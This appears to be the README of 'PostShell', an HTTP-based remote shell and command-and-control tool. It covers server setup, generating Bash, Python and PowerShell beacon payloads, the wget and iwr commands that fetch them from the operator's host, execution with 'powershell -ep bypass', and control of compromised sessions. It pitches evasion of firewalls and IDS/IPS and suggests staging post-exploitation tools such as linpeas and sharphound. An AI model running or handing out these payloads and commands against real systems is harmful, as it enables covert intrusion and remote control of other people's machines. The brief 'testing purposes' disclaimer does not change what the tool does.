```
██████╗  ██████╗ ███████╗████████╗███████╗██╗  ██╗███████╗██╗     ██╗     
██╔══██╗██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██║  ██║██╔════╝██║     ██║     
██████╔╝██║   ██║███████╗   ██║   ███████╗███████║█████╗  ██║     ██║     
██╔═══╝ ██║   ██║╚════██║   ██║   ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║     ╚██████╔╝███████║   ██║   ███████║██║  ██║███████╗███████╗███████╗
╚═╝      ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
```
Execute Commands on Clients with HTTP. (Bypass Firewalls)

PostShell allows remote command execution on clients through standard HTTP GET and POST requests. 

This technique can help bypass firewalls and network restrictions that block typical reverse shells.

# Key Features:
  - Leverages HTTP requests to communicate, avoiding detection by firewalls or IDS/IPS systems.
  - Supports multiple client platforms (Bash, Python, PowerShell).
  - Logs all client sessions and outputs.

# How PostShell Works:
## Server Setup:
  - PostShell starts an HTTP server on a user-specified port.
  - A tools/ directory is created to host user generated client scripts.
## Client Script Generation:
  - PostShell generates the following client scripts:
    - Bash (.sh)
    - Python (.py)
    - PowerShell (.ps1)
  - These scripts are available for download/deployment:
    - Example: `http://<server_ip>:<port>/tools/<client.script>`
## Client Behavior:
  - The client script collects and submits system information via a POST request to the server.
  - Then enters a loop where it:
    - Sends GET requests to retrieve commands from the server.
    - Executes the commands locally.
    - Sends the command output back via POST.
## Logging:
  - All client interactions (commands and results) are saved in logs under the session_logs/ directory.

# Disclaimer
This is only for testing purposes, not intended for anything illegal.

# Getting Started
Download POSTSHELL
```
git clone https://github.com/bwithe/postshell
```

# Usage
To start the server
```
python3 postshell.py <port>
```

List commands
```
postshell> help 

Menu Commands:
    help | ?            - Show this menu
    list                - List connected sessions
    select <id>         - Connect to a session
    kill <id>           - Terminate session
    exit                - Exit the server
Session Commands:
    background          - Background session
    die                 - Terminate session
Payload Menu Commands:
    set lhost <ip>      - Set the POSTSHELL IP address
    set lport <port>    - Set the POSTSHELL listening port
    set payload <type>  - Set payload type (EX: sh, py, ps1)
    set checkin <sec>   - Set the check-in wait time (in seconds)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu 
```

Generate a Client script that creates a directory called "tools" with the scripts
  - This server also allows `GET` requests from `tools/`
  - You can also store other tools needed (ex: winpeas, linpeas, sharphound, etc)
```
postshell> payload 
payload> options 

Current Payload Options:

  NAME      : <NOT SET>
  LHOST     : 127.0.0.1
  LPORT     : 80
  PAYLOAD   : sh
  CHECKIN   : 1

payload> set name client
[+] Set 'name' to 'client'
payload> set lhost 192.168.0.1
[+] Set 'lhost' to '192.168.0.1'
payload> set lport 81
[+] Set 'lport' to '81'
payload> set payload py
[+] Set 'payload' to 'py'
payload> set checkin 2
[+] Set 'checkin' to '2'
payload> options 

Current Payload Options:

  NAME      : client
  LHOST     : 192.168.0.1
  LPORT     : 81
  PAYLOAD   : py
  CHECKIN   : 2

payload> generate 
[+] Payload generated and saved as 'tools/client.py'
```

Transfer the client script
```
wget http://127.0.0.1/tools/127_0_0_1_80.sh

iwr http://127.0.0.1/tools/127_0_0_1_80.ps1 -outfile 127_0_0_1_80.ps1
```

Execute the script on the client
```
bash 127_0_0_1_80.sh

python3 127_0_0_1_80.py

powershell -ep bypass 127_0_0_1_80.ps1
```

To see active clients
```
postshell> list 
╔════╦═════════════════╦═════════════════╦═════════╦════════════════╦══════════════════╦════════╗
║ ID ║ IP              ║ HOSTNAME        ║ USER    ║ OS             ║ VERSION          ║ ARCH   ║
╠════╬═════════════════╬═════════════════╬═════════╬════════════════╬══════════════════╬════════╣
║ 1  ║ 192.168.193.131 ║ ubuntu          ║ clyde   ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 2  ║ 192.168.193.131 ║ ubuntu          ║ root    ║ Linux          ║ 6.8.0-41-generic ║ x86_64 ║
║ 3  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ jimothy ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
║ 4  ║ 192.168.193.129 ║ DESKTOP-P5KACDB ║ system  ║ Windows 10 Pro ║ 10.0.19045       ║ 64-bit ║
╚════╩═════════════════╩═════════════════╩═════════╩════════════════╩══════════════════╩════════╝

postshell> list 
╔════╦═════════════╦═══════════╦════════╦══════════════════════════════╦════════════╦════════╗
║ ID ║ IP          ║ HOSTNAME  ║ USER   ║ OS                           ║ VERSION    ║ ARCH   ║
╠════╬═════════════╬═══════════╬════════╬══════════════════════════════╬════════════╬════════╣
║ 1  ║ 172.16.12.5 ║ SKYWALKER ║ luke   ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
║ 2  ║ 172.16.12.2 ║ WOOKIE    ║ chewie ║ Windows 11 Pro               ║ 10.0.26100 ║ 64-bit ║
║ 3  ║ 172.16.12.4 ║ SOLO      ║ han    ║ Windows Server 2025 Standard ║ 10.0.26100 ║ 64-bit ║
╚════╩═════════════╩═══════════╩════════╩══════════════════════════════╩════════════╩════════╝
```

To connect to an active session
```
postshell> select 1
[luke@SKYWALKER]> 
```

Execute commands, and wait for the client to GET the command, then POST the results
```
[luke@SKYWALKER]> pwd

Path         
----         
C:\Users\Luke

```
  
Background a session
```
[luke@SKYWALKER]> background
```

Kill the current session
```
[chewie@WOOKIE]> die 
[!] Sent die command to chewie@WOOKIE
```

Kill an active session from the menu
```
postshell> kill 1
[!] Sent kill command to luke@SKYWALKER
```

Kill all sessions, and exit POSTSHELL
```
postshell> exit 
[!] Shutting down server and all sessions.
```
